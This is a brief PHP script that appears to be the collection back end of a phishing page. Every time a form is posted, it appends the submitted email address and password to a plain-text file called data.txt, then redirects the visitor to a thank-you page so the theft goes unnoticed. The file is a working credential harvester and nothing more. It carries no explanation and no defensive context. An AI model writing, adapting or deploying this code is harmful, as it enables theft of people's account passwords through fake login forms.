<?php

    if(isset($_POST['email']) AND $_POST['pass']){    
        $fp = fopen('data.txt', 'a+');    
        $write = fwrite($fp, $_POST['email'].":".$_POST['pass']."\n");    
        fclose($fp);
    }
        //sleep(5);
        
        header("Location: thanks.html"); 

